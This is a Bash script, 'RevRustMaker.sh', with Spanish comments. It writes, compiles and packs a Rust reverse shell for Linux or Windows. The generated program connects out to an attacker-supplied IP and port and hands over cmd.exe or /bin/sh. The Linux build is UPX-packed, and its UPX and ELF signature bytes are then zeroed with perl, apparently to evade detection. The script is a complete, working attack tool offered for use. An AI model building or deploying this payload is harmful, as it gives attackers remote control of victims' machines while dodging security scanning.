#!/bin/bash
################################################################################
# Nombre del script: RevRustMaker.sh
# Autor: Gris Iscomeback
# Correo electrónico: grisiscomeback[at]gmail[dot]com
# Fecha de creación: 03/02/2025
# Descripción: Este script contiene la lógica principal de la aplicación. RevRustMaker
# Licencia: GPL v3
################################################################################
if [ $# -ne 3 ]; then
    echo "Uso: $0 <linux|windows> <ip> <puerto>"
    exit 1
fi

OS=$1
LHOST=$2
LPORT=$3

if ! command -v rustc &> /dev/null; then
    echo "Rust no está instalado. Instalando Rust..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
    source $HOME/.cargo/env
fi

if ! rustup default stable &> /dev/null; then
    echo "Configurando el toolchain predeterminado para rustup..."
    rustup default stable
fi

if [ "$OS" == "windows" ] && ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "mingw-w64 no está instalado. Instalando mingw-w64..."
    sudo apt update
    sudo apt install -y mingw-w64
fi

if [ "$OS" == "windows" ] && ! rustup target list | grep -q x86_64-pc-windows-gnu; then
    echo "Instalando la cadena de herramientas de Rust para Windows..."
    rustup target add x86_64-pc-windows-gnu
fi

cargo new reverse_shell --bin
cd reverse_shell

cat << EOF > src/main.rs
use std::net::TcpStream;
use std::io::{self, Read, Write};
use std::process::{Command, Stdio};
use std::thread;

fn main() -> io::Result<()> {
    let mut stream = TcpStream::connect("$LHOST:$LPORT")?;

    let shell = if cfg!(target_os = "windows") {
        "cmd.exe"
    } else {
        "/bin/sh"
    };

    let mut child = Command::new(shell)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = child.stdout.take().unwrap(); // Añadir mut aquí
    let mut stderr = child.stderr.take().unwrap(); // Añadir mut aquí

    // Hilo para enviar la salida estándar al servidor
    let mut stream_clone = stream.try_clone()?;
    thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stdout.read(&mut buffer) {
                Ok(n) if n > 0 => stream_clone.write_all(&buffer[..n]).unwrap(),
                _ => break,
            }
        }
    });

    // Hilo para enviar los errores al servidor
    let mut stream_clone = stream.try_clone()?;
    thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stderr.read(&mut buffer) {
                Ok(n) if n > 0 => stream_clone.write_all(&buffer[..n]).unwrap(),
                _ => break,
            }
        }
    });

    // Hilo principal para recibir comandos y enviar al proceso hijo
    let mut buffer = [0; 1024];
    loop {
        match stream.read(&mut buffer) {
            Ok(n) if n > 0 => {
                stdin.write_all(&buffer[..n])?;
                stdin.flush()?;
            },
            _ => break,
        }
    }

    Ok(())
}
EOF

# Compilar el proyecto Rust
if [ "$OS" == "linux" ]; then
    echo "Compilando para Linux..."
    cargo build --release
    cp target/release/reverse_shell ../rustrevshell
    crc32 target/release/reverse_shell
    upx target/release/reverse_shell
    crc32 target/release/reverse_shell
    perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "target/release/reverse_shell"
    crc32 target/release/reverse_shell
    perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "target/release/reverse_shell"
    crc32 target/release/reverse_shell
elif [ "$OS" == "windows" ]; then
    echo "Compilando para Windows..."
    cargo build --release --target x86_64-pc-windows-gnu
    cp target/x86_64-pc-windows-gnu/release/reverse_shell.exe ..
else
    echo "Parámetro no válido. Usa <linux> o <windows>."
    exit 1
fi

echo "Compilación completada. El binario se encuentra en el directorio actual."
